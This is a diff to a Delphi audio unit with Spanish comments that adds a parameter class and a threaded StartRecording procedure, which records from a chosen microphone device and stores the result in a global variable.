@@ -5,7 +5,7 @@ unit UnitAudio;
 interface
 
 uses
-  Windows, sysutils;
+  Windows, sysutils, UnitVariables;
 
   const
   WAVE_INVALIDFORMAT     = $00000000;       { invalid format }
@@ -122,11 +122,42 @@ uses
 
   function DispositivosDeAudio():string; //Para conseguir la lista de los micrófonos del pc
   function GrabaAudio(Dispositivo:integer;Duracion: integer;CapturasPorSegundo, BitsPorCaptura, Canales: word;var tmp : string):string;    //Graba X segundos de audio de un dispositivo determinado
+  procedure StartRecording(Parameter: Pointer);
+
+type
+  TAudioInfo = class(TObject)
+  public
+    disp, dur , hz , bits, chan : integer;
+    ThreadId: longword;
+    constructor Create(fDisp, fDur, fhz, fbits, fchan:integer); overload;
+
+end;
+  
 implementation
 
 var
   Hwaveinh      : HWaveIn;
 
+  constructor TAudioInfo.Create(fDisp, fDur, fhz, fbits, fchan:integer);
+  begin
+    Disp :=   fDisp;
+    Dur  :=   fDur;
+    hz   :=   fHZ;
+    bits :=   fBits;
+    chan :=   fChan;
+  end;
+
+  procedure StartRecording(Parameter: Pointer);
+  var
+    AudioInfo: TAudioInfo;
+    Tmp : string;
+  begin
+    AudioInfo := TAudioInfo(Parameter);
+    GrabaAudio(AudioInfo.Disp, AudioInfo.Dur, AudioInfo.hz, AudioInfo.bits, AudioInfo.chan,tmp);
+    RecordedAudio := tmp;
+    ExitThread(0);
+  end;
+  
   function DispositivosDeAudio():string;    //Lista los dispositivos de audio disponibles 
   var
     WaveInCaps : TWaveInCapsA;
